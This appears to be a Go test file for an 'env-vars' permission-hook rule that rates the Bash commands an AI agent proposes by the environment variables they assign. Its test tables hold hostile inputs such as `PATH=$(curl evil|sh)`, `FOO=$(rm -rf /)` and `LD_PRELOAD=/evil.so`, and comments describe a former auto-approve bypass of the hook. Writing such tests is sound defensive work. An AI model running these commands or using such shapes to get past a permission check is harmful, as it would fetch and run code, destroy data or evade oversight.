// TestEnvVars_HomeTempDir_Ask pins the required regressions: this relief MUST
// NOT widen beyond "grounded in a `mktemp -d` DIRECTORY, this same command".
func TestEnvVars_HomeTempDir_Ask(t *testing.T) {
	commands := []string{
		// REQUIRED REGRESSION (bead AC): no hermetic marker at all.
		"export HOME=/replaced",
		// $T is never assigned anywhere in the command — ambient, exactly like
		// pg2-qhhil's own ambient-variable regression.
		"HOME=$T",
		`env -i HOME="$TD" ./run.sh`,
		// $T IS assigned in-command, but to an ordinary LITERAL, not a mktemp -d
		// call — an arbitrary directory is not distinguishable from a hijack.
		"T=/tmp/x; HOME=$T",
		// $T is assigned via a DIFFERENT safe-cmd substitution — `date`, not
		// `mktemp -d` — so it carries none of the "nothing could have
		// pre-staged this" guarantee mktemp -d's freshness gives.
		"T=$(date +%F); HOME=$T",
		// mktemp WITHOUT -d/--directory creates a FILE, not a directory — HOME
		// pointed at a file is not the shape this relief covers.
		"HOME=$(mktemp)",
		"T=$(mktemp); HOME=$T",
		// The in-command mktemp -d binding is REVOKED by a later reassignment to
		// something that is not itself a fresh temp dir (InCommandTempDirVars'
		// revocation rule, mirroring cmdparse.InCommandVars').
		"T=$(mktemp -d); T=/tmp/other; HOME=$T",
		// Direct form requires the value be NOTHING BUT the substitution — a
		// literal prefix/suffix around it is deliberately out of scope (a
		// narrower predicate than the var-ref+suffix shape above, which
		// composes the suffix check against a KNOWN marker rather than
		// re-deriving the substitution's exact span).
		`HOME="$(mktemp -d)/h"`,
		// PATH is NOT in scope for this relief — the operator ruling authorized
		// it for HOME only; PATH's own replacement relief is the env -i shape.
		"PATH=$(mktemp -d)",
		`T=$(mktemp -d); PATH=$T`,
	}
	for _, ctor := range []struct {
		name string
		rule *Rule
	}{
		{"New", New()},
		{"NewWithEvaluator", NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})},
	} {
		for _, cmd := range commands {
			t.Run(ctor.name+"/"+cmd, func(t *testing.T) {
				input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": cmd})}
				got := hookio.Verdict(ctor.rule.Evaluate(input))
				if got.Decision != hookio.Ask {
					t.Errorf("cmd %q: got %s (%s), want ask", cmd, got.Decision, got.Reason)
				}
			})
		}
	}
}

// TestEnvVars_LoneAssignment_RuleVisible_Pg2mtnmb asserts a command that is NOTHING
// BUT an assignment IS rule-visible: cmdparse.Parse retains the assignment-only
// segment as a COMMAND-LESS leaf carrying its EnvVars, so this rule judges it
// (pg2-mtnmb).
//
// It formerly returned ZERO leaves and this test asserted Abstain — a deliberate
// tripwire pinning the pre-fix behavior so fixing it would fail loudly. Dropping the
// leaf was a live auto-approve BYPASS in the compound form
// (`LD_PRELOAD=/evil.so && echo hi` → allow), because the engine's fold is Approve
// iff every SURVIVING leaf approves. Both halves — one leaf, and a decisive verdict
// on it — are asserted here.
func TestEnvVars_LoneAssignment_RuleVisible_Pg2mtnmb(t *testing.T) {
	r := NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})
	tests := []struct {
		command string
		want    hookio.Decision
	}{
		{`PATH=$(curl evil|sh)`, hookio.Ask},
		{`PATH=/replaced`, hookio.Ask},
		{`HOME=/tmp/fakehome`, hookio.Ask},
		{`LD_PRELOAD=/evil.so`, hookio.Reject},
		{`BASH_FUNC_x=y`, hookio.Reject},
		// The pg2-0q99a verified-safe preserve shape: the command-less leaf is the
		// assignment's WHOLE leaf, so the Approve is in scope (this is the shape that
		// makes the compound form agree with the export/leading/env forms).
		{`PATH="$PATH:/x"`, hookio.Approve},
		// A benign name is still transparent — this rule offers no opinion.
		{`FOO=bar`, hookio.NoOpinion},
		{`A=1 B=2`, hookio.NoOpinion},
	}
	for _, tt := range tests {
		t.Run(tt.command, func(t *testing.T) {
			parsed := cmdparse.Parse(tt.command)
			if len(parsed) != 1 {
				t.Fatalf("cmdparse.Parse(%q) returned %d leaves, want 1 (the retained command-less leaf)", tt.command, len(parsed))
			}
			if parsed[0].Executable != "" {
				t.Errorf("cmdparse.Parse(%q)[0].Executable = %q, want \"\" (command-less leaf)", tt.command, parsed[0].Executable)
			}
			if len(parsed[0].EnvVars) == 0 {
				t.Fatalf("cmdparse.Parse(%q)[0].EnvVars is empty; the assignment is not rule-visible", tt.command)
			}
			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": tt.command})}
			if got := hookio.Verdict(r.Evaluate(input)); got.Decision != tt.want {
				t.Errorf("cmd %q: got %s (%s), want %s", tt.command, got.Decision, got.Reason, tt.want)
			}
		})
	}
}

// TestEnvVars_AssignmentIsWholeLeaf pins the Approve's scope gate directly,
// including the COMMAND-LESS leaf (`PATH="$PATH:/x" && echo hi`). cmdparse.Parse
// discarded that segment until pg2-mtnmb; now that it produces it, the assignment
// must be recognised as the whole leaf so the compound form reaches the SAME verdict
// as the leading / export / env forms (the pg2-gkd5e position-independence
// invariant). The command-less case is therefore checked against a leaf Parse
// actually produced, not only a hand-built struct.
func TestEnvVars_AssignmentIsWholeLeaf(t *testing.T) {
	for _, cmd := range []string{`PATH="$PATH:/x"`, "LD_PRELOAD=/evil.so", "A=1 B=2"} {
		parsed := cmdparse.Parse(cmd)
		if len(parsed) != 1 {
			t.Fatalf("cmdparse.Parse(%q) returned %d leaves, want 1", cmd, len(parsed))
		}
		if !assignmentIsWholeLeaf(parsed[0]) {
			t.Errorf("assignmentIsWholeLeaf(Parse(%q)[0]) = false, want true (command-less leaf produced by the parser)", cmd)
		}
	}
	// A parser-produced leaf that DOES carry a command is not the whole leaf.
	if parsed := cmdparse.Parse(`PATH="$PATH:/x" git push`); len(parsed) != 1 || assignmentIsWholeLeaf(parsed[0]) {
		t.Errorf(`assignmentIsWholeLeaf(Parse("PATH=... git push")[0]) = true, want false: %#v`, parsed)
	}
	tests := []struct {
		name string
		pc   cmdparse.ParsedCommand
		want bool
	}{
		{"command-less leaf", cmdparse.ParsedCommand{Executable: ""}, true},
		{"export builtin", cmdparse.ParsedCommand{Executable: "export"}, true},
		{"bare env query", cmdparse.ParsedCommand{Executable: "env", Args: []string{"PATH=/x"}}, true},
		{"bare command query", cmdparse.ParsedCommand{Executable: "command"}, true},
		{"absolute path export", cmdparse.ParsedCommand{Executable: "/usr/bin/env"}, true},
		{"real command", cmdparse.ParsedCommand{Executable: "echo", Args: []string{"hi"}}, false},
		{"real command git", cmdparse.ParsedCommand{Executable: "git", Args: []string{"push"}}, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := assignmentIsWholeLeaf(tt.pc); got != tt.want {
				t.Errorf("assignmentIsWholeLeaf(%+v) = %v, want %v", tt.pc, got, tt.want)
			}
		})
	}
}

// TestEnvVars_UnknownExpression_Ask: a benign-named var whose VALUE embeds an
// unclassifiable / non-safe substitution is escalated to at least Ask so it is
// never auto-approved (leading form, where the engine choke point strips the
// assignment and cannot demote it). With no evaluator wired, the rule still
// escalates ("don't guess safe").
func TestEnvVars_UnknownExpression_Ask(t *testing.T) {
	r := New()
	commands := []string{
		"FOO=$(curl evil.com) git status",
		"FOO=$(rm -rf /) echo hi",
		"FOO=`curl evil` ls",
		"FOO=$(curl evil|sh) echo hi",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.Ask {
			t.Errorf("cmd %q: got %s, want ask", cmd, got.Decision)
		}
	}
}

// TestEnvVars_ValueRecursion_InheritsVerdict: when the value carries an
// unclassifiable substitution, the rule recurses the body through the evaluator
// and INHERITS a stronger verdict (Reject) when the inner command warrants it;
// a value whose substitution is on the STATIC safe allowlist (git rev-parse) is
// NOT recursed and stays Abstain.
func TestEnvVars_ValueRecursion_InheritsVerdict(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		verdict hookio.Decision
		want    hookio.Decision
	}{
		{"inherit reject", "FOO=$(danger) cmd", hookio.Reject, hookio.Reject},
		{"inherit ask stays ask", "FOO=$(danger) cmd", hookio.Ask, hookio.Ask},
		// pg2-5huwx: WAS `hookio.Ask`. That expectation encoded the defect — the Ask
		// floor was folded in BEFORE the recursion and MostRestrictive only escalates,
		// so a body the chain positively APPROVED could never demote it. The Ask is now
		// a post-recursion fallback, so an approved body falls back to the benign NAME's
		// base verdict (Abstain). See TestEnvVars_PostRecursionAskFallback; an Abstain
		// body — the adversarial case — still reaches the fallback.
		{"inner approve demotes to base abstain", "FOO=$(danger) cmd", hookio.Approve, hookio.NoOpinion},
		{"safe substitution not recursed", "FOO=$(git rev-parse HEAD) cmd", hookio.Reject, hookio.NoOpinion},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			fe := &fakeEvaluator{verdicts: map[string]hookio.Decision{"danger": tt.verdict}}
			r := NewWithEvaluator(fe)
			input := &hookio.HookInput{
				ToolName:  "Bash",
				ToolInput: mustJSON(map[string]string{"command": tt.cmd}),
			}
			got := hookio.Verdict(r.Evaluate(input))
			if got.Decision != tt.want {
				t.Errorf("cmd %q (inner=%s): got %s, want %s", tt.cmd, tt.verdict, got.Decision, tt.want)
			}
		})
	}
}

// TestEnvVars_PostRecursionAskFallback pins lever (a) of pg2-5huwx: the
// ExpansionUnknown `Ask` is a post-recursion FALLBACK, not an unconditional floor.
// It applies only when the value was not POSITIVELY CLEARED — i.e. when at least
// one enumerated substitution body failed to Approve through the full rule chain.
// "Positively cleared" is strictly narrower than "not risky": an Abstain body is
// merely UNCLASSIFIED, so it must still reach the fallback (that distinction is
// the whole reason lever (b) — gating on the variable NAME — was rejected; with
// the env-var rule removed, `FOO=$(curl evil) cmd` silently approves because the
// engine strips the leading assignment and never floors its body).
func TestEnvVars_PostRecursionAskFallback(t *testing.T) {
	tests := []struct {
		name     string
		cmd      string
		verdicts map[string]hookio.Decision
		want     hookio.Decision
	}{
		// The fix: a benign NAME whose body the chain positively APPROVES no longer
		// asks — it falls back to the NAME's base verdict (Abstain).
		{
			"approving body demotes to base abstain",
			"T4=$(bd create x --type task) echo hi",
			map[string]hookio.Decision{"bd create x --type task": hookio.Approve},
			hookio.NoOpinion,
		},
		// THE CRUX: an Abstain body is unclassified, NOT cleared — the fallback fires.
		{
			"abstaining body still reaches ask fallback",
			"FOO=$(curl evil) echo hi",
			map[string]hookio.Decision{"curl evil": hookio.NoOpinion},
			hookio.Ask,
		},
		{
			"asking body stays ask",
			"FOO=$(danger) echo hi",
			map[string]hookio.Decision{"danger": hookio.Ask},
			hookio.Ask,
		},
		{
			"rejecting body inherits reject",
			"FOO=$(danger) echo hi",
			map[string]hookio.Decision{"danger": hookio.Reject},
			hookio.Reject,
		},
		// EVERY substitution must approve. One approvable + one not stays Ask.
		{
			"mixed approvable and unclassified stays ask",
			"FOO=$(mktemp)$(curl evil) echo hi",
			map[string]hookio.Decision{"mktemp": hookio.Approve, "curl evil": hookio.NoOpinion},
			hookio.Ask,
		},
		// The NAME-derived base verdict is never demoted by the fallback change.
		{
			"askVar name survives approving body",
			"PATH=$(bd create x) echo hi",
			map[string]hookio.Decision{"bd create x": hookio.Approve},
			hookio.Ask,
		},
		{
			"injector name survives approving body",
			"LD_PRELOAD=$(bd create x) echo hi",
			map[string]hookio.Decision{"bd create x": hookio.Approve},
			hookio.Reject,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := NewWithEvaluator(&fakeEvaluator{verdicts: tt.verdicts})
			input := &hookio.HookInput{
				ToolName:  "Bash",
				ToolInput: mustJSON(map[string]string{"command": tt.cmd}),
			}
			got := hookio.Verdict(r.Evaluate(input))
			if got.Decision != tt.want {
				t.Errorf("cmd %q: got %s (%s), want %s", tt.cmd, got.Decision, got.Reason, tt.want)
			}
		})
	}
}

// TestEnvVars_UnenumerableUnknownValue_Ask closes the vacuous-truth hole in lever
// (a): "every enumerated substitution approved" must NOT be satisfied by a value
// that enumerates to ZERO substitutions while still being classified
// ExpansionUnknown (e.g. an unterminated `$(`). With no substitution to clear it,
// the value is unclassifiable and the Ask fallback MUST apply.
func TestEnvVars_UnenumerableUnknownValue_Ask(t *testing.T) {
	r := NewWithEvaluator(&fakeEvaluator{verdicts: map[string]hookio.Decision{}})
	ev := cmdparse.EnvAssignment{
		Name:      "FOO",
		Value:     "$(curl evil",
		Raw:       "FOO=$(curl evil",
		Expansion: cmdparse.ExpansionUnknown,
	}
	if subs := cmdparse.EnumerateSubstitutions(ev.Value); len(subs) != 0 {
		t.Fatalf("precondition: EnumerateSubstitutions(%q) returned %d subs, want 0", ev.Value, len(subs))
	}
	got, refused := r.evaluateAssignment(ev, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false)
	if got.Decision != hookio.Ask {
		t.Errorf("unenumerable unknown value: got %s (%s), want ask", got.Decision, got.Reason)
	}
	// ADR 0044: it must also not be CLASSIFIED as an exhaustion. Both halves of the
	// un-cleared bucket Ask, so a misclassification moves no verdict today — but the
	// reason is what a future ruling on the exhaustion half would be counted from, and
	// a vacuously-cleared value filed under "no rule models this" would be counted as
	// relievable when it is unclassifiable by construction.
	if !refused {
		t.Error("unenumerable unknown value: not marked as examined-and-refused")
	}
	if strings.Contains(got.Reason, "no rule models") {
		t.Errorf("unenumerable unknown value: reason %q classifies it as an EXHAUSTION; it enumerates to zero substitutions and is unclassifiable", got.Reason)
	}
}

// TestEnvVars_ApproveOnlyForVerifiedPreserveForm is the successor to the former
// TestEnvVars_NeverApprove, which asserted "the rule NEVER returns Approve".
// pg2-0q99a deliberately RETIRES that blanket property — it was the reason 984
// corpus prompts with zero true positives could not be cleared — and replaces it
// with the narrowest property that still forbids every auto-approval the old one
// existed to forbid:
//
//	env-vars returns Approve for an askVar (PATH/HOME) assignment that (a)
//	satisfies ONE of preservesCallerValue / isHermeticEnvReplacement /
//	isHermeticHomeReplacement (pg2-d71my widened (a) from one predicate to
//	three; it did not touch (b)), and (b) is the WHOLE leaf, so the Approve
//	cannot pre-empt a later rule's verdict on a real command.
//
// Everything else — injectors, replacements not covered by any of the three
// predicates, unclassifiable values, benign names, non-Bash tools, and even a
// verified-safe value when it sits beside a real command — must NOT Approve.
// This table asserts EXACT equality against wantApprove in both directions, so
// it fails if the Approve ever widens.
func TestEnvVars_ApproveOnlyForVerifiedPreserveForm(t *testing.T) {
	fe := &fakeEvaluator{verdicts: map[string]hookio.Decision{"x": hookio.Approve}}
	r := NewWithEvaluator(fe)
	tests := []struct {
		cmd         string
		wantApprove bool
	}{
		// THE one approvable shape: preserve + static-absolute components + whole leaf.
		{`export PATH="$PATH:/x"`, true},
		{`export PATH="/x:$PATH"`, true},
		{`export PATH="${PATH}:/x"`, true},
		{`export HOME="$HOME"`, true},
		{`env PATH="$PATH:/x"`, true},

		// pg2-qhhil: THE new approvable shape — a component naming a variable this
		// SAME COMMAND assigned, earlier, to a static absolute path is exactly as
		// inspectable as the literal spelling above.
		{`bindir=/tmp/x/bin; PATH="$bindir:$PATH"`, true},
		{`TEST_DIR=/tmp/bats-run; PATH="$TEST_DIR/bin:$PATH"`, true},

		// pg2-d71my: THE two new approvable shapes, per the 2026-08-17 ruling.
		// isHermeticEnvReplacement — a static, reasonable REPLACEMENT under a
		// hermetic `env -i`, where there is no caller value left to preserve.
		{"env -i PATH=/usr/bin:/bin", true},
		{"env -i HOME=/tmp", true},
		{"env -i PATH=/usr/bin:/bin HOME=/tmp", true},
		// isHermeticHomeReplacement — HOME grounded in a `mktemp -d` fresh temp
		// dir this same command created, directly or via an earlier variable.
		{"HOME=$(mktemp -d)", true},
		{`T=$(mktemp -d); HOME="$T/h"`, true},

		// pg2-kzqw2: THE new approvable shape — a component that is not itself a
		// static absolute path but is a certified-safe command substitution
		// (cmdparse.IsSafeSubstitutionBody) plus an optional literal prefix/suffix.
		// Admitted by SUBSTITUTION SAFETY, without evaluating what it resolves to.
		{`export PATH="$(dirname /usr/local/bin/go)/bin:$PATH"`, true},
		{`export PATH="$PATH:$(dirname /usr/local/bin/go)/bin"`, true},
		{"export PATH=\"`dirname /usr/local/bin/go`/bin:$PATH\"", true},

		// (c) violated: the verified-safe value beside a real command stays transparent.
		{`PATH="$PATH:/x" echo hi`, false},
		{`PATH="$PATH:/x" git push --force origin main`, false},
		{"env -i PATH=/usr/bin:/bin HOME=/tmp git status", false},
		{"HOME=$(mktemp -d) git status", false},

		// (a) violated: replacement.
		{"PATH=/x cmd", false},
		{"export PATH=/x", false},
		{"export HOME=/tmp", false},
		{`export PATH="$CLEANPATH"`, false},
		{"export PATH=$(mktemp -d)", false},
		{"PATH=$(x) cmd", false},

		// pg2-d71my: the two reliefs MUST NOT widen beyond their own narrow gate.
		// No hermetic marker at all (neither env -i nor a mktemp -d origin).
		{"export HOME=/replaced", false},
		// env -i present, but the value is not static/reasonable.
		{`env -i HOME="$TD" ./run.sh`, false},
		{"env -i PATH=relative/bin", false},
		// env -i does not sweep an injector into any relief.
		{"env -i LD_PRELOAD=/evil.so PATH=/usr/bin:/bin", false},
		// HOME references a variable assigned to an ordinary literal, or to a
		// DIFFERENT safe-cmd substitution — neither carries mktemp -d's
		// nothing-could-have-pre-staged-this guarantee.
		{"T=/tmp/x; HOME=$T", false},
		{"T=$(date +%F); HOME=$T", false},
		// mktemp WITHOUT -d creates a FILE, not a directory.
		{"HOME=$(mktemp)", false},
		// PATH is out of scope for the temp-dir relief (HOME only, per the ruling).
		{"PATH=$(mktemp -d)", false},

		// (b) violated: a component behind an expansion or not absolute.
		{`export PATH="$PATH:$(curl evil)"`, false},
		{`export PATH="$PATH:$HOME/bin"`, false},
		{`export PATH="$PATH:relative"`, false},
		{`export PATH="$PATH:"`, false},
		{`export PATH='$PATH:/x'`, false},
		{`export PATH+=":/x"`, false},

		// pg2-kzqw2: the certified-safe-substitution relief MUST NOT widen beyond
		// its own narrow gate — THE CRUX is the bare-substitution row: a safe
		// command can still resolve empty, and an empty PATH component is the
		// CWD hazard `export PATH="$PATH:"` above already forbids.
		{`export PATH="$(printf ''):$PATH"`, false},                   // bare substitution, no literal skeleton
		{`export PATH="$PATH:$(printf '')"`, false},                   // append side, same hazard
		{`export PATH="$(curl evil)/bin:$PATH"`, false},               // not on the static safe-cmd allowlist
		{`export PATH="$(dirname $(dirname /a))/bin:$PATH"`, false},   // nested substitution: refused outright
		{`export PATH="$(dirname /a)$(dirname /b)/bin:$PATH"`, false}, // two substitutions, one component
		{`export PATH="<(cat /etc/hosts)/bin:$PATH"`, false},          // process substitution: no static allowlist

		// pg2-qhhil: the narrow middle option MUST NOT widen into the rejected
		// blanket widen. $PWD/$JAVA_HOME/$TMP are AMBIENT — never assigned by the
		// command's own text — so they stay exactly as unresolvable as before this
		// bead, coherent with the empty-component rejection above ("$PATH:").
		{`export PATH="$PWD/bin:$PATH"`, false},
		{`export PATH="$JAVA_HOME/bin:$PATH"`, false},
		{`export PATH="$TMP:$PATH"`, false},
		// The direct contrast with the new true rows above: SAME value text,
		// but $bindir is never assigned anywhere in the command (no preceding
		// leaf), so it is indistinguishable from an ambient variable here.
		{`PATH="$bindir:$PATH"`, false},
		// A DIFFERENT name was bound; $bindir itself was not.
		{`other=/tmp/x/bin; PATH="$bindir:$PATH"`, false},
		// The in-command literal binding is REVOKED by a later non-literal
		// reassignment of the SAME name (cmdparse.InCommandVars' revocation rule) —
		// the seam's existing fail-safe behaviour must carry through this wiring.
		{`bindir=/tmp/x/bin; bindir=$(mktemp -d); PATH="$bindir:$PATH"`, false},

		// pg2-5jj3m: ENV was demoted from Reject to a decisive Ask. The demotion must
		// NOT have moved it into the value-aware Approve band — no value shape, not even
		// one that reads like the verified-safe PATH preserve form, may approve it.
		{`export ENV="$ENV:/x"`, false},
		{"ENV=dev cmd", false},
		{"export ENV=dev", false},
		{"ENV=/tmp/evil.sh cmd", false},

		// Injectors and BASH_FUNC_* are never approvable, whatever the value shape.
		{"LD_PRELOAD=/e cmd", false},
		{`export LD_PRELOAD="$LD_PRELOAD:/x"`, false},
		{`export LD_LIBRARY_PATH="$LD_LIBRARY_PATH:/x"`, false},
		{`export BASH_FUNC_foo="$BASH_FUNC_foo:/x"`, false},

		// pg2-hed0a: the ExpansionKind guard at the head of preservesCallerValue
		// (`!= ExpansionVarRef`) must not become permissive when the classifier moves to
		// the seam. Two directions are pinned.
		//
		// (1) Values that NEWLY classify VarRef, because the parser sees that a `$(` or
		// backtick inside single quotes or behind a backslash is literal where the old
		// substring scan read it as live. VarRef is the ONLY kind that reaches this
		// predicate at all, so these are exactly the spellings that could have widened
		// the Approve. They do not: each row's ExpansionKind census counts BOTH a
		// param ref and a substitution/arithmetic node, so the `!= ExpansionVarRef`
		// guard above still refuses it before cmdparse.LiteralAssignmentValueText
		// (the structural replacement for the former literalValue, pg2-30wro) is
		// ever reached.
		{`export PATH="${OTHER}:` + "\\`printf /etc/hosts\\`" + `"`, false},
		{`export PATH="$PATH:\$(curl evil)"`, false},
		{"export PATH=\"$PATH:\\`id\\`\"", false},
		// (2) The arithmetic mask itself must not buy the preserve-form Approve. A value
		// carrying an arithmetic expansion is not a var ref, so it fails the guard even
		// though the `$PATH:` prefix reads like the verified-safe shape.
		{`export PATH="$PATH:/x"$((1))`, false},
		{`export PATH=$((1))"$PATH:/x"`, false},
		{`export PATH="$PATH:/x$((1))"`, false},

		// Benign names are Abstain (deferred), never Approve — the rule must not start
		// green-lighting leaves it has no opinion about.
		{"FOO=bar cmd", false},
		{"FOO=$(x) cmd", false},
		{`export FOO="$FOO:/x"`, false},
		{"PYTHONPATH=/foo bin/pytool run", false},
		{"git status", false},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			input := &hookio.HookInput{ToolName: "Bash", ToolInput: mustJSON(map[string]string{"command": tt.cmd})}
			got := hookio.Verdict(r.Evaluate(input))
			if isApprove := got.Decision == hookio.Approve; isApprove != tt.wantApprove {
				t.Errorf("cmd %q: got %s (%s); approve=%v, want approve=%v",
					tt.cmd, got.Decision, got.Reason, isApprove, tt.wantApprove)
			}
		})
	}

	// Non-Bash tools never reach the assignment logic at all.
	nonBash := &hookio.HookInput{ToolName: "Read", ToolInput: mustJSON(map[string]string{"file_path": "/tmp/x"})}
	if got := hookio.Verdict(r.Evaluate(nonBash)); got.Decision == hookio.Approve {
		t.Errorf("non-Bash tool: got approve; env-vars must Abstain on non-Bash input")
	}
}

func TestEnvVars_SafeStaticVars_Abstain(t *testing.T) {
	r := New()
	commands := []string{
		"PYTHONPATH=/foo bin/pytool run",
		"NO_COLOR=1 ls",
		"GOFLAGS=-count=1 go test",
		"GIT_DIR=/other git log",
		"KUBECONFIG=/other kubectl get pods",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.NoOpinion {
			t.Errorf("cmd %q: got %s, want abstain", cmd, got.Decision)
		}
	}
}

func TestEnvVars_SafeExpressions_Abstain(t *testing.T) {
	r := New()
	commands := []string{
		"FOO=$(mktemp -d) cmd",
		"FOO=$HOME cmd",
		"FOO=${USER:-nobody} cmd",
		"FOO=$((1+2)) cmd",
		"FOO=$(date +%F) cmd",
		"FOO=`whoami` cmd",
	}
	for _, cmd := range commands {
		input := &hookio.HookInput{
			ToolName:  "Bash",
			ToolInput: mustJSON(map[string]string{"command": cmd}),
		}
		got := hookio.Verdict(r.Evaluate(input))
		if got.Decision != hookio.NoOpinion {
			t.Errorf("cmd %q: got %s, want abstain", cmd, got.Decision)
		}
	}
}

func TestEnvVars_NoEnvVars_Abstain(t *testing.T) {
	r := New()
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "git status"}),
	}
	got := hookio.Verdict(r.Evaluate(input))
	if got.Decision != hookio.NoOpinion {
		t.Errorf("git status (no env vars): got %s, want abstain", got.Decision)
	}
}

func TestEnvVars_NonBash_Abstain(t *testing.T) {
	r := New()
	input := &hookio.HookInput{
		ToolName:  "Read",
		ToolInput: mustJSON(map[string]string{"file_path": "/tmp/x"}),
	}
	got := hookio.Verdict(r.Evaluate(input))
	if got.Decision != hookio.NoOpinion {
		t.Errorf("Read tool: got %s, want abstain", got.Decision)
	}
}

func TestEnvVars_WidenedSafeSubstitution_NoUnclassifiableReason(t *testing.T) {
	r := New()
	input := &hookio.HookInput{
		ToolName:  "Bash",
		ToolInput: mustJSON(map[string]string{"command": "FOO=$(git rev-parse HEAD) make"}),
	}
	got := hookio.Verdict(r.Evaluate(input))
	if got.Decision != hookio.NoOpinion {
		t.Errorf("cmd %q: got %s, want abstain", "FOO=$(git rev-parse HEAD) make", got.Decision)
	}
	if strings.Contains(got.Reason, "unclassifiable expression") {
		t.Errorf("cmd %q: got Reason %q, want no unclassifiable-expression reason (git rev-parse is now a safe substitution)", "FOO=$(git rev-parse HEAD) make", got.Reason)
	}
}

// TestSanitizeReasonName pins the reason-hygiene contract (pg2-3ggxm layer 3):
// a variable NAME embedded in a user-facing permissionDecisionReason is bounded in
// length and has its control characters escaped. An ordinary name must pass through
// untouched so the existing reasons read exactly as before.
func TestSanitizeReasonName(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{"ordinary name unchanged", "LD_PRELOAD", "LD_PRELOAD"},
		{"lowercase unchanged", "foo_1", "foo_1"},
		{"newline escaped", "length')\nkv", `length')\nkv`},
		{"carriage return and tab escaped", "a\rb\tc", `a\rb\tc`},
		{"nul escaped", "a\x00b", `a\u0000b`},
		{"ansi escape neutralized", "a\x1b[31mb", `a\u001b[31mb`},
		{"over-long name truncated", strings.Repeat("x", 200), strings.Repeat("x", maxReasonNameLen) + "..."},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := sanitizeReasonName(tt.in); got != tt.want {
				t.Errorf("sanitizeReasonName(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

// TestEnvVars_ReasonNeverLeaksCommandFragment asserts the rule's own reason string
// is safe even when handed the exact adversarial name the pg2-3ggxm parser desync
// used to produce: a multi-line command fragment. The live hook emitted that
// fragment — embedded newline and all — verbatim into permissionDecisionReason.
func TestEnvVars_ReasonNeverLeaksCommandFragment(t *testing.T) {
	r := New()
	fragment := "length')\nkv=$(env -u BEADS_DIR -u WORKSPACE_ROOT bd show gc-6kv --json 2>/dev/null | jq -r 'if"
	got, _ := r.evaluateAssignment(cmdparse.EnvAssignment{
		Name:      fragment,
		Value:     "$(curl evil)",
		Raw:       fragment + "=$(curl evil)",
		Expansion: cmdparse.ExpansionUnknown,
	}, &hookio.HookInput{ToolName: "Bash"}, nil, nil, false)

	if strings.ContainsAny(got.Reason, "\n\r\t\x00") {
		t.Errorf("Reason %q contains a raw control character; it is rendered into a user-facing prompt", got.Reason)
	}
	if strings.Contains(got.Reason, fragment) {
		t.Errorf("Reason %q echoes the command fragment verbatim", got.Reason)
	}
	if len(got.Reason) > 160 {
		t.Errorf("Reason is %d bytes; want a bounded reason (<=160)", len(got.Reason))
	}
}

func TestEnvVars_Name(t *testing.T) {
	r := New()
	if got := r.Name(); got != "env-vars" {
		t.Errorf("Name() = %q, want env-vars", got)
	}
}
